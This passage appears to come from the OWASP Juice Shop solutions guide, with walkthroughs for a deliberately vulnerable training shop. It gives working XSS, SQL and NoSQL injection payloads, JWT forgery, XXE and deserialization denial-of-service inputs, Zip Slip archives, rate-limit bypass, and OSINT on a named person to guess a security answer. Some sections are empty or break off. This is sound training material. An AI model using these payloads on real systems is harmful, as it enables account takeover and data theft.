<iframe src="javascript:xmlhttp = new XMLHttpRequest();
   xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic');
   xmlhttp.setRequestHeader('Authorization',`Bearer=${localStorage.getItem('token')}`);
   xmlhttp.send();">
</iframe>
----

Anyone who is logged in to the Juice Shop while clicking on this link
will get their password set to the same one we forced onto Bender!

👏 Kudos to Joe Butler, who originally described this advanced XSS
payload in his blog post

=== Stick cute cross-domain kittens all over our delivery boxes

. Log in with any user and go to
http://localhost:3000/#/deluxe-membership
. Right-click and _Inspect_ the image of the delivery boxes with the
Juice Shop logo on them.
. You will notice that this image is in fact an inline `<svg>` tag that
includes six `<image>` tags. One is loading
`assets/public/images/deluxe/blankBoxes.png` and the other five load
`assets/public/images/JuiceShop_Logo.png` in different sizes and
positions onto the SVG graphic.
. Open the `main.js` in your browser DevTools and search for the
corresponding Angular controller code related to that page and SVG
image
. You will be able to spot six `:svg:image` references, one of them
`blankBoxes.png` and the other five seemingly unspecified at that
time.
+
image::appendix/delivery-boxes_inline_svg.png[Inline SVG in Angular controller]

. Scrolling only slightly further down, you will notice a code location
where a property `t.logoSrc` is passed into some non-descriptive
function five times.
+
image::appendix/delivery-boxes_apply_logoSrc.png[Property logoSrc passed into SVG five times]

. Scroll up in the source code a few hundred lines until you reach the
declaration of the controller (`class Ht` in the following
screenshot). There you find the definition of `this.logoSrc =
"assets/public/images/JuiceShop_Logo.png"`.
. In the subsequent `ngOnInit()` function is overwritten with either
the `application.logo` value coming out of the
`getApplicationConfiguration()` service...
. ...or - if specified - the value of the URL query parameter
`testDecal`! It seems the developers used this for testing the
overlay images on the SVG but forgot to remove it before go-live!
D'uh!
+
image::appendix/delivery-boxes_testDecal.png[Forgotten query parameter testDecal]

. Try the `testDecal` parameter, e.g. by going to
http://localhost:3000/#/deluxe-membership?testDecal=test. You will
notice that the logos on the boxes are now gone or display a broken
image symbol.
+
image::appendix/delivery-boxes_apply_testDecal.png[Probing the behavior of testDecal]

. As the logo references are relative, you cannot simply do e.g.
http://localhost:3000/#/deluxe-membership?testDecal=https:%2F%2Fplacekitten.com%2Fg%2F400%2F500
as this would result in the application to request the logos from
the relative URL
`+assets/public/images/https://placekitten.com/g/400/500+` which
obviously cannot work.
. As you are dealing with a relative path, you can try if path
traversal works, so you could get to the root of the web server e.g.
via
http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2Ftest.
This will indeed result in the image actually being requested as
http://localhost:3000/test!
+
image::appendix/delivery-boxes_testDecal_path_traversal.png[Testing path traversal via testDecal]

. It might not seem like it, but this behavior is a huge step forward!
If the Juice Shop web server only offered a URL which would be able
to _redirect_ you to any external location and grab those images...
. ...which _it does_ in the form of the
http://localhost:3000/redirect endpoint! If you haven't done so
yet, you should stop here and
<<_enforce_a_redirect_to_a_page_you_are_not_supposed_to_redirect_to,Enforce a redirect to a page you are not supposed to redirect to>>
first!
. Combining that redirect exploit with the forgotten `testDecal` and
its susceptibility to path traversal will allow you to craft a URL
like
http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop
where the most difficult part is to get the URL encoding just right
to bypass the redirect allowlist and still get the intended image
returned cross-domain.

=== Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to

. Visit https://stackoverflow.com/questions/tagged/access-log to find
all questions tagged with `access-log` in this popular platform
. The list of questions should not be excessive and one mentioning a
familiar URL path might immediately stand out
+
image::appendix/stackoverflow_access-log.png[Questions tagged 'access-log' on StackOverflow]

. Visit
https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan
to find more unambiguous URL paths from the Juice Shop in it
+
image::appendix/stackoverflow_morgan_question.png[Question on expressjs/morgan configuration]

. Follow the link to PasteBin that is mentioned below the log file
snippet in _"(see https://pastebin.com/4U1V1UjU for more)"_
. On https://pastebin.com/4U1V1UjU search for `password` to find log
entries that might help with the ultimate challenge goal
. You will find one particularly interesting `GET` request that has
been logged as `+161.194.17.103 - - [27/Jan/2019:11:18:35 +0000] "GET
/rest/user/change-password?current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB&new=sjss22%@%E2%82%AC55jaJasj!.k&repeat=sjss22%@%E2%82%AC55jaJasj!.k8
HTTP/1.1" 401 39 "http://localhost:3000/" "Mozilla/5.0 (Linux;
Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/71.0.3578.99 Mobile Safari/537.36"+`
. The mismatched `new` and `repeat` parameters and the return code of
`401` indicate that this password change failed. This means the
password could still be the current one of
`0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB`!
. This isn't the exact clear text password, though. It was logged as
part of a URL, so it needs to be URL-decoded into
`0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB` first.
. Not knowing which user it belongs to, you can now
 ** either perform a _Password Spraying_ attack by trying to log in
with the password for all known user emails, e.g. from
<<_access_the_administration_section_of_the_store,Access the administration section of the store>>
 ** hash the known password with `MD5` and compare it to the password
hashes harvested from
<<_retrieve_a_list_of_all_user_credentials_via_sql_injection,Retrieve a list of all user credentials via SQL Injection>>
. Either way you will conclude that the password belongs to
`J12934@juice-sh.op` so using this as _Email_ and
`0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB` as _Password_ on
http://localhost:3000/#/login will solve the challenge

🤡 Did you notice that one of the next requests of `161.194.17.103` in
the leaked access log went to http://localhost:3000/api/Complaints and
returned a `201 Created` HTTP status code? It seems the user
successfully complained, but eventually didn't bother or was too
frustrated to finish what he originally planned to do.

=== Perform an unwanted information disclosure by accessing data cross-domain

. Find a request to the `/rest/user/whoami` API endpoint. Notice
that you can remove the "Authorization" header and it still works.
image:appendix/normal_whoami.png[Normal whoami call]
. Add a URL parameter called "callback". This will cause the API to
return the content as a JavaScript fragment (JSONP) rather than just
a standard JSON object.
image:appendix/jsonp_whoami.png[whoami call using JSONP]

=== Log in with the (non-existing) accountant without ever registering that user

. Go to http://localhost:3000/#/login and try logging in with _Email_
`'` and any _Password_ while observing the Browser DevTools network
tab.
. You will notice the SQL query for the login in the error being
thrown: `"sql": "SELECT * FROM Users WHERE email = ''' AND password =
'339df5aeae5bc6ae557491e02619c5dd' AND deletedAt IS NULL"`
. Solve
<<_exfiltrate_the_entire_db_schema_definition_via_sql_injection,Exfiltrate the entire DB schema definition via SQL Injection>>
to learn the exact column names of the `Users` table.
. Prepare a `UNION SELECT` payload what will a) ensure there is no
result from the original query and b) will add the needed user
on-the-fly using static values in the query.
. Log in with _Email_ `' UNION SELECT * FROM (SELECT 15 as 'id', '' as
'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as
'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4'
as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as
'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16
14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00'
as 'updatedAt', null as 'deletedAt')--`
. This will trick the application backend into handing out a valid JWT
token and thus establishing a user session.

=== Retrieve the language file that never made it into production

. Monitoring the HTTP calls to the backend when switching languages
tells you how the translations are loaded:
 ** http://localhost:3000/i18n/en.json
 ** http://localhost:3000/i18n/de_DE.json
 ** http://localhost:3000/i18n/nl_NL.json
 ** http://localhost:3000/i18n/zh_CN.json
 ** http://localhost:3000/i18n/zh_HK.json
 ** etc.
. It is obvious the language files are stored with the official
_locale_ as name using underscore notation.
. Nonetheless, even brute forcing all thinkable locale codes (`aa_AA`,
`ab_AA`, ..., `zz_ZY`, `zz_ZZ`) would still *not* solve the
challenge.
. The hidden language is _Klingon_ which is represented by a
three-letter code `tlh` with the dummy country code `AA`.
. Request http://localhost:3000/i18n/tlh_AA.json to solve the
challenge. majQa'!

Instead of expanding your brute force pattern (which is not a very
obvious decision to make) you can more easily find the solution to this
challenge by investigating which languages are supported in the Juice
Shop and how xref:../part3/translation.adoc[the translations] are managed.
This will quickly bring you over to
https://crowdin.com/project/owasp-juice-shop which immediately
spoilers _Klingon_ as a supported language. Hovering over the
corresponding flag will eventually spoiler the language code `tlh_AA`.

image::appendix/crowdin_klingon-spoiler.png[Crowdin Klingon Spoiler]

____
The Klingon language was originally created to add realism to a race
of fictional aliens who inhabit the world of Star Trek, an American
television and movie franchise. Although Klingons themselves have
never existed, the Klingon language is real. It has developed from
gibberish to a usable means of communication, complete with its own
vocabulary, grammar, figures of speech, and even slang and regional
dialects. Today it is spoken by humans all over the world, in many
contexts.footnote:3[http://www.kli.org/about-klingon/klingon-history]

=== Solve the 2FA challenge for user "wurstbrot"

. <<_access_the_administration_section_of_the_store,Access the administration section of the store>>
while inspecting network traffic.
. You will learn the email address of the user in question is
unsurprisingly `wurstbrot@juice-sh.op`.
. You will also notice that there is no information about any user's
2FA configuration in the responses from `/api/Users`.
. Solve
<<_retrieve_a_list_of_all_user_credentials_via_sql_injection,Retrieve a list of all user credentials via SQL Injection>>
and keep its final attack payload ready.
. Change the one of the ``null``s in payload to hopefully find a column
that contains the secret key for the 2FA setup:
 ** http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null,null%20from%20users--
yields a `500` error with `SequelizeDatabaseError: SQLITE_ERROR: no
such column: 2fa`.
 ** http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fakey,null,null,null,null%20from%20users--
fails with `no such column: 2fakey`.
 ** http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fasecret,null,null,null,null%20from%20users--
fails with `no such column: 2fasecret`.
 ** http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totp,null,null,null,null%20from%20users--
also fails with `no such column: totp`.
 ** http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpkey,null,null,null,null%20from%20users--
fails again yielding `no such column: totpkey`.
 ** http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users--
finally succeeds with a `200` response as this column exists!
. In the response from
http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users--
find the entry of user `wurstbrot@juice-sh.op` with
`"image":"IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"` whereas all other users
have `"image":""` set.
. Using your favorite 2FA application (e.g.
https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2[Google Authenticator])
create a new entry, but instead of scanning any QR code type in the
key `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH` manually.
. Go to link:http:localhost:3000/#/login[http:localhost:3000/#/login] and use SQL Injection to log in
with `wurstbrot@juice-sh.op'--` as _Username_ and anything as
_Password_.
. You will be presented with the _Two Factor Authentication_ input
screen where you now have to type in the 6-digit code currently
displayed on your 2FA app.
+
image:appendix/2fa_authenticator.png[Google Authenticator for wurstbrot]
image:appendix/2fa_challenge.png[2FA input dialog]

. After clicking _Log in_ you are logged in and the challenge will be
marked as solved!

=== Forge an essentially unsigned JWT token

. Log in as any user to receive a valid JWT in the `Authorization`
header.
. Copy the JWT (i.e. everything after `Bearer ` in the `Authorization`
header) and decode it.
. Under the `payload` property, change the `email` attribute in the
JSON to `jwtn3d@juice-sh.op`.
. Change the value of the `alg` property in the `header` part from
`HS256` to `none`.
. Encode the `header` to `base64url`. Similarly, encode the `payload`
to `base64url`. _base64url makes it URL safe_, a regular Base64
encode might not work!
. Join the two strings obtained above with a `.` (dot symbol) and add a
`.` at the end of the obtained string. So, effectively it becomes
`base64url(header).base64url(payload).`
. Change the `Authorization` header of a subsequent request to the
retrieved JWT (prefixed with `Bearer ` as before) and submit the
request. Alternatively you can set the `token` cookie to the JWT
which be used to populate any future request with that header.

=== All your orders are belong to us

. Open the network tab of your browser's DevTools.
. Log in with any user that previously ordered something and visit http://localhost:3000/#/order-history
. Click on the _Track Order_ button (depicting a truck) of any order
. Witness a `GET` request to a URL starting with `+http://localhost:3000/rest/track-order/+` and ending with a seemingly random sequence of characters (which is actually the _Order ID_)
. Try out http://localhost:3000/rest/track-order/x to receive a response of `{"status":"success","data":[{"orderId":"x"}]}`.
. Search for `'` (single quote) as _Order ID_ now.
http://localhost:3000/rest/track-order/' will throw an error
+
image::appendix/error_page-nosqli.png[NoSQL query error from invalid token]

. Searching for `''` (two single quotes) as _Order ID_ now will let
http://localhost:3000/rest/track-order/'' throw an `Unexpected
string` error instead of the previous `Invalid or unexpected token`.
. While not stated anywhere in the error messages, it can be assumed
with some MongoDB background that the query probably resembles
something like `{ $where: "property === '" + payload + "'" }`.
. The required `payload` for the challenge needs to make sure all data
is matched while squeezing itself into the query in a non-breaking
way.
. Search for `' || true || '` resulting in
http://localhost:3000/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'
which will in fact query and return all orders from the MarsDB.

=== Perform a Remote Code Execution that would keep a less hardened application busy forever

. By manual or automated URL discovery you can find a
https://swagger.io[Swagger] API documentation hosted at
http://localhost:3000/api-docs which describes the B2B API.
+
image::appendix/swagger_api-docs.png[Swagger API-Docs]

. This API allows to `POST` orders where the order lines can be sent as
JSON objects (`orderLines`) but also as a String (`orderLinesData`).
. The given example for `orderLinesDate` indicates that this String
might be allowed to contain arbitrary JSON: `+[{"productId":
12,"quantity": 10000,"customerReference": ["PO0000001.2",
"SM20180105|042"],"couponCode": "pes[Bh.u*t"},...]+`
+
image::appendix/swagger_models-order.png[Swagger Order Model]

. Click the _Try it out_ button and without changing anything click
_Execute_ to see if and how the API is working. This will give you a
`401` error saying `No Authorization header was found`.
. Go back to the application, log in as any user and copy your token
from the `Authorization Bearer` header using your browser's DevTools.
. Back at http://localhost:3000/api-docs/#/Order/post_orders click
_Authorize_ and paste your token into the `Value` field.
. Click _Try it out_ and _Execute_ to see a successful `200` response.
. An insecure JSON deserialization would execute any function call
defined within the JSON String, so a possible payload for a DoS
attack would be an endless loop. Replace the example code with
`{"orderLinesData": "(function dos() { while(true); })()"}` in the
_Request Body_ field. Click _Execute_.
. The server should eventually respond with a `200` after roughly 2
seconds, because that is defined as a timeout so you do not really
DoS your Juice Shop server.
. If your request successfully bumped into the infinite loop
protection, the challenge is marked as solved.

=== Reset the password of Bjoern's internal account via the Forgot Password mechanism

. Trying to find out who "Bjoern" might be should quickly lead you to
the OWASP Juice Shop project leader and author of this ebook.
. Visit https://www.facebook.com/bjoern.kimminich to immediately learn
that he is from the town of _Uetersen_ in Germany.
. Visit https://gist.github.com/9045923 or
https://pastebin.com/JL5E0RfX to find the source code of a (truly
amazing) game Bjoern wrote in Turbo Pascal in 1995 (when he was a
teenager) to learn his phone number area code of _04122_ which
belongs to Uetersen. This is sufficient proof that you in fact are on
the right track.
. http://www.geopostcodes.com/Uetersen will tell you that Uetersen has
ZIP code _25436_.
. Visit http://localhost:3000/#/forgot-password and provide
`bjoern@juice-sh.op` as your _Email_.
. In the subsequently appearing form, provide `25436` as _Your
ZIP/postal code when you were a teenager?_
. Type and _New Password_ and matching _Repeat New Password_ followed
by hitting _Change_ to *not solve* this challenge.
. Bjoern added some obscurity to his security answer by using an
uncommon variant of the pre-unification format of
<<postal-codes-in-germany,postal codes in Germany>>.
. Visit http://www.alte-postleitzahlen.de/uetersen to learn that
Uetersen's old ZIP code was `W-2082`. This would not work as an
answer either. Bjoern used the written out variation: `West-2082`.
. Change the answer to _Your ZIP/postal code when you were a
teenager?_ into `West-2082` and click _Change_ again to finally
solve this challenge.

==== Postal codes in Germany

____
Postal codes in Germany, Postleitzahl (plural Postleitzahlen,
abbreviated to PLZ; literally "postal routing number"), since 1 July
1993 consist of five digits. The first two digits indicate the wider
area, the last three digits the postal district.

Before reunification, both the Federal Republic of Germany (FRG) and
the German Democratic Republic (GDR) used four-digit codes. Under a
transitional arrangement following reunification, between 1989 and
1993 postal codes in the west were prefixed with 'W', e.g.: W-1000
[Berlin] 30 (postal districts in western cities were separate from
the postal code) and those in the east with 'O' (for Ost), e.g.:
O-1xxx Berlin.footnote:4[https://en.wikipedia.org/wiki/List_of_postal_codes_in_Germany]

=== Reset Morty's password via the Forgot Password mechanism

. Trying to find out who "Morty" might be should _eventually_ lead you
to _Morty Smith_ as the most likely user identity
+
image::appendix/Morty_Smith.jpg[Morty Smith]

. Visit http://rickandmorty.wikia.com/wiki/Morty and skim through the
http://rickandmorty.wikia.com/wiki/Morty#Family[Family] section
. It tells you that Morty had a dog named _Snuffles_ which also goes by
the alias of _Snowball_ for a while.
. Visit http://localhost:3000/#/forgot-password and provide
`morty@juice-sh.op` as your _Email_
. Create a word list of all mutations (including typical
"leet-speak"-variations!) of the strings `snuffles` and `snowball`
using only
 ** lower case (`a-z`)
 ** upper case (`A-Z`)
 ** and digit characters (`0-9`)
. Write a script that iterates over the word list and sends well-formed
requests to `+http://localhost:3000/rest/user/reset-password+`. A rate
limiting mechanism will prevent you from sending more than 100
requests within 5 minutes, severely hampering your brute force
attack.
. Change your script so that it provides a different
`X-Forwarded-For`-header in each request, as this takes precedence
over the client IP in determining the origin of a request.
. Rerun your script you will notice at some point that the answer to
the security question is `5N0wb41L` and the challenge is marked as
solved.
. Feel free to cancel the script execution at this point.

Leet (or "1337"), also known as eleet or leetspeak, is a system of
modified spellings and verbiage used primarily on the Internet for
many phonetic languages. It uses some alphabetic characters to replace
others in ways thdev at play on the similarity of their glyphs via
reflection or other resemblance. Additionally, it modifies certain
words based on a system of suffixes and alternative meanings.

The term "leet" is derived from the word elite. The leet lexicon
involves a specialized form of symbolic writing. For example, leet
spellings of the word leet include 1337 and l33t; eleet may be spelled
31337 or 3l33t. Leet may also be considered a substitution cipher,
although many dialects or linguistic varieties exist in different
online communities.footnote:5[https://en.wikipedia.org/wiki/Leet]

=== Deprive the shop of earnings by downloading the blueprint for one of its products

=== Inform the development team about a danger to some of their credentials

. Solve
<<_access_a_developers_forgotten_backup_file,Access a developer's forgotten backup file>>
. The `package.json.bak` contains not only runtime dependencies but
also development dependencies under the `devDependencies` section.
. Go through the list of `devDependencies` and perform research on
vulnerabilities in them which would allow a Software Supply Chain
Attack.
. For the `eslint-scope` module you will learn about one such incident
exactly in the pinned version `3.7.2`, e.g.
https://status.npmjs.org/incidents/dn7c1fgrr7ng or
https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes

=== Inform the shop about a typosquatting imposter that dug itself deep into the frontend

. Request http://localhost:3000/3rdpartylicenses.txt to retrieve the
3rd party license list generated by Angular CLI by default
. Combing through the list of modules you will come across
`anuglar2-qrcode` which openly reveals its intent on

this challenge

You can probably imagine that the typosquatted `anuglar2-qrcode` would
be _a lot harder_ to distinguish from the original repository
`ngx-bar-rating`, if it where not marked with the _THIS IS *NOT* THE
MODULE YOU ARE LOOKING FOR!_-warning at the very top. Below you can see
the original `ngx-bar-rating` module page on NPM:

=== Give the server something to chew on for quite a while

. Solve the
<<_use_a_deprecated_b2b_interface_that_was_not_properly_shut_down,Use a deprecated B2B interface that was not properly shut down>>
challenge.
. On Linux, prepare an XML file which defines and uses an external
entity which will require a long time to resolve: `<!ENTITY xxe
SYSTEM "file:///dev/random">`. On Windows there is no similar feature
to retrieve randomness from the OS via an "endless" file, so the
attack vector has to be completely different. A _quadratic blowup_
attack works fine, consisting of a single large entity like `+<!ENTITY
a "dosdosdosdos...dos"+`> which is replicated very often as in
`+<foo>&a;&a;&a;&a;&a;...&a;</foo>+`.
. Upload this file through the _File Complaint_ dialog and observe how
the request processing takes up to 2 seconds and then times out (to
prevent you from actually DoS'ing your application) but still solving
the challenge.

_You might feel tempted to try the classic *Billion laughs attack* but
will quickly notice that the XML parser is hardened against it, giving
you a status `410` HTTP error saying `Detected an entity reference
loop`._

____
In computer security, a billion laughs attack is a type of
denial-of-service (DoS) attack which is aimed at parsers of XML
documents.

It is also referred to as an XML bomb or as an exponential entity
expansion attack.

The example attack consists of defining 10 entities, each defined as
consisting of 10 of the previous entity, with the document consisting
of a single instance of the largest entity, which expands to one
billion copies of the first entity.

In the most frequently cited example, the first entity is the string
"lol", hence the name "billion laughs". The amount of computer memory
used would likely exceed that available to the process parsing the XML
(it certainly would have at the time the vulnerability was first
reported).

While the original form of the attack was aimed specifically at XML
parsers, the term may be applicable to similar subjects as well.

The problem was first reported as early as 2002, but began to be
widely addressed in 2008.

Defenses against this kind of attack include capping the memory
allocated in an individual parser if loss of the document is
acceptable, or treating entities symbolically and expanding them
lazily only when (and to the extent) their content is to be used.footnote:6[https://en.wikipedia.org/wiki/Billion_laughs_attack]

=== Permanently disable the support chatbot

. The Chatbot is built using an npm module called 'juicy-chat-bot'. The
source code for the same can be found
https://github.com/juice-shop/juicy-chat-bot[here]
. Looking through the source, one can determine that user messages are
processed inside a VM context, with a function called `process`
. The vulnerable segment of the code is
https://github.com/juice-shop/juicy-chat-bot/blob/15e424609dc59ada5bf0c114ca7a5ffc718501cc/index.js#L31[this statement],
that the bot uses to remember usernames. The command
*this.factory.run(`users.addUser("$\{token}", "$\{name}")`)* is
equivalent to an eval statement inside the VM context. This can be
exploited by including `"` and `)` in one's username
. If one sets their username to *admin"); process=null;
users.addUser("1337", "test*, the final statement that gets executed
would be
+
`users.addUser("token", "admin");` +
`process = null;` +
`users.addUser("1337", "test")`

The process function, is therefore set to null and any further attempt
by the bot to process a user's message would result in an error

=== Gain read access to an arbitrary local file on the web server

. Log in with any user account and go to _Account_ > _Privacy and Security_ > _Request Data Erasure_.
. Fill in the fields _Confirm Email Address_ and _Answer_ with random data and submit. Using your browser's developer tools or an intercepting proxy, notice that a `POST` request is issued with two body parameters (`email` and `securityAnswer`)
. Using your favorite fuzzing tool and wordlist, start to fuzz the body parameters.
. Notice an unhandled `500 Internal Server Error` when a parameter `layout` is provided in the request. Also, notice that the error response says `Error: ENOENT: no such file or directory` indicating that we might have hit the LFR vulnerability. We can also see the full pathname of the file the application is trying to access: `<root_directory>/juice-shop/views/<value_of_layout_parameter>`
. Based on the previous error message, we can guess (or bruteforce) a valid filename. For example, issuing another `POST` request with the following body will solve the challenge: `layout=../package.json`

This vulnerability arises when ExpressJS is using Handlebars as a template engine and it can even lead to RCE in some cases. You can read more about it in this https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/[blog post by Juice Shop's former Google Summer of Code student Shoeb Patel].

=== Overwrite the Legal Information file [[overwrite-the-legal-information-file]]

. Combing through the updates of the
https://twitter.com/owasp_juiceshop[@owasp_juiceshop] Twitter
account you will notice

. Researching ZIP-based vulnerabilities should also yield
https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf[Zip Slip] which
exploits directory traversal filenames in file archives.
. As the Legal Information file you need to override lives in
http://localhost:3000/ftp/legal.adoc and uploading files via _File
Complaint_ does not give any feedback where they are stored, an
iterative directory traversal approach is recommended.
. Prepare a ZIP file (on Linux) with `zip exploit.zip ../ftp/legal.adoc`.
. Log in as any user at http://localhost:3000/#/login.
. Click _Contact Us_ and _Complain?_ to get to the _File Complaint_
screen at http://localhost:3000/#/complain.
. Type in any message and attach your ZIP file, then click _Submit_.
. The challenge will _not_ be solved. Repeat steps 5-7 but with `zip
exploit.zip ../../ftp/legal.adoc` as the payload.
. The challenge will be marked as solved! When you visit
http://localhost:3000/ftp/legal.adoc you will see your overwritten
Legal Information!

____
Zip Slip is a form of directory traversal that can be exploited by
extracting files from an archive. The premise of the directory
traversal vulnerability is that an attacker can gain access to parts
of the file system outside of the target folder in which they should
reside. The attacker can then overwrite executable files and either
invoke them remotely or wait for the system or user to call them, thus
achieving *remote command execution* on the victim's machine. The
vulnerability can also cause damage by overwriting configuration files
or other sensitive resources, and can be exploited on both client
(user) machines and servers. footnote:8[https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf]

=== Forge a coupon code that gives you a discount of at least 80%

For this challenge there are actually two distinct _solution paths_ that
are both viable. These will be explained separately as they utilize
totally different attack styles.

==== _Pattern analysis_ solution path

. Solve challenge
<<_access_a_salesmans_forgotten_backup_file,Access a salesman's forgotten backup file>>
to get the `coupons_2013.adoc.bak` file with old coupon codes which you
find listed below.
. There is an obvious pattern in the last characters, as the first
eleven codes end with `gC7sn` and the last with `gC7ss`.
. You can rightfully speculate that the last five characters represent
the actual discount value. The change in the last character for the
12th code comes from a different (probably higher) discount in
December! 🎅
. Check the official Juice Shop Twitter account for a valid coupon
code: https://twitter.com/owasp_juiceshop
. At the time of this writing - January 2017 - the broadcasted coupon
was `n<Mibh.u)v` promising a 50% discount.
. Assuming that the discount value is encoded in the last 2-5
characters of the code, you could now start a trial-end-error or
brute force attack generating codes and try redeeming them on the
_Your Basket_ page. At some point you will probably hit one that
gives 80% or more discount.
. You need to _Checkout_ after redeeming your code to solve the
challenge.

----

==== _Reverse engineering_ solution path

. Going through the dependencies mentioned in `package.json.bak` you
can speculate that at least one of them could be involved in the
coupon code generation.
. Narrowing the dependencies down to crypto or hashing libraries you
would end up with `hashids`, `jsonwebtoken` and `z85` as candidates.
. It turns out that `z85`
(https://rfc.zeromq.org/spec:32/Z85/[ZeroMQ Base-85 Encoding]) was
chosen as the coupon code-creation algorithm.
. Visit https://www.npmjs.com/package/z85 and check the _Dependents_
tab:
+
image::appendix/z85-dependents.png[Dependents of z85 on npmjs.com]

. If you have Node.js installed locally run `npm install -g z85-cli` to
install https://www.npmjs.com/package/z85-cli - a simple command
line interface for `z85`:
+
image::appendix/z85-cli.png[z85-cli page on npmjs.com]

. Check the official Juice Shop Twitter account
https://twitter.com/owasp_juiceshop for a valid coupon code. At the
time of this writing - January 2017 - the broadcasted coupon was
`n<Mibh.u)v` promising a 50% discount.
+
image::appendix/coupon_code-january2017.png[Coupon Code for January 2017 on @owasp_juiceshop]

. Decrypting this code with `z85 -d "n<Mibh.u)v"` returns `JAN17-50`
. Encrypt a code valid for the current month with 80% or more discount,
e.g. `z85 -e JAN17-80` which yields `n<Mibh.v0y`.
. Enter and redeem the generated code on the _Your Basket_ page and
_Checkout_ to solve the challenge.

==== _Cloud computing_ solution path

. From February 2019 onward the monthly coupon tweets begin with a
robot face emoji in square brackets. Maybe the Juice Shop sales team
forgot to send coupons too often so that the process was automated at
some point?
+
image::appendix/coupon_tweet_bot.png[Coupon tweeted by a bot]

. Some Internet research will bring you to the
https://www.npmjs.com/package/juicy-coupon-bot[NPM module `juicy-coupon-bot`]
and its associated GitHub repository
https://github.com/juice-shop/juicy-coupon-bot. ℹ️ _As this is
not part of the Juice Shop repo itself and it is publicly accessible,
analyzing this repository is *not* considered cheating!_
. Open the
https://github.com/juice-shop/juicy-coupon-bot/blob/master/.github/workflows/coupon-distribution.yml[`.github/workflows/coupon-distribution.yml`]
to see how the bot's _Monthly Coupon Distribution_ workflow is set
up. You can also look at the job results and logs at
https://github.com/juice-shop/juicy-coupon-bot/actions?query=workflow%3A%22Monthly+Coupon+Distribution%22.
. If you read the logs of the _Distribute coupons_ step, you will
notice an `info: [✔] API lookup success` message at the very
beginning. But where exactly does the bot get its coupon code from?
. Read the code of the `juicy-coupon-bot` carefully and optionally try
to play with it locally after installing it via `npm i -g
juicy-coupon-bot`. You can learn a few things that way:
 ** Running `juicy-coupon-bot` locally will
https://github.com/juice-shop/juicy-coupon-bot/blob/master/lib/statusText.js[prepare the text for a tweet with a coupon code]
for the current month and with a discount between 10% and 40% and
log it to your console.
 ** The coupon code is actually retrieved
https://5j4d1u7jhf.execute-api.eu-west-1.amazonaws.com/default/JuicyCouponFunc[via an AWS API call]
which returns valid coupons with different discounts and their
expiration date as JSON, e.g.
`{"discountCodes":{"10%":"mNYS#iv#%t","20%":"mNYS#iw00u","30%":"mNYS#iw03v","40%":"mNYS#iw06w"},"expiryDate":"2019-02-28"}`
. You could collect this data for several months and basically fall
back to the
<<_pattern_analysis_solution_path,Pattern analysis solution path>>
only with more recent coupons.
. For an easier and more satisfying victory over this challenge, take a
look at the commit history of the GitHub repository
https://github.com/juice-shop/juicy-coupon-bot, though.
. Going back in time a bit, you will learn that the coupon retrieval
via AWS API backed by a Lambda function was not the original
implementation. Commit
https://github.com/juice-shop/juicy-coupon-bot/commit/fde2003535598ad3c4edc17ad9ffcdc9c589d3c5[`fde2003`]
introduced the API call, replacing the previous programmatic creation
of a coupon code.
+
image::appendix/git-diff_coupon_lambda.png[Diff of local and cloud-based coupon creation]

. You now have learned the coupon format and that it is `z85` encoded.
You can now either manipulate your local clone of the "pre-`fde2003`
version" of the `juicy-coupon-bot` or fall back to the last part of
the
<<_reverse_engineering_solution_path,Reverse engineering solution path>>
where you find and install `z85-cli` to conveniently create your own
80%+ coupon locally.

=== Solve challenge #999

. Solve any other challenge
. Inspect the cookies in your browser to find a `continueCode` cookie
. The `package.json.bak` contains the library used for generating these
continue codes: `hashid`
. Visit http://hashids.org/ to get some information about the
mechanism
. Follow the link labeled _check out the demo_
(http://codepen.io/ivanakimov/pen/bNmExm)
. The Juice Shop simply uses the example salt (`this is my salt`) and
also the default character range
(`abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890`)
from that demo page. It just uses a minimum length of `60` instead of
`8` for the resulting hash.
. Encoding the value `999` with the demo (see code below) gives you the
hash result
`69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj`
. Send a `PUT` request to the URL
http://localhost:3000/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
to solve this challenge.

[,javascript]
----
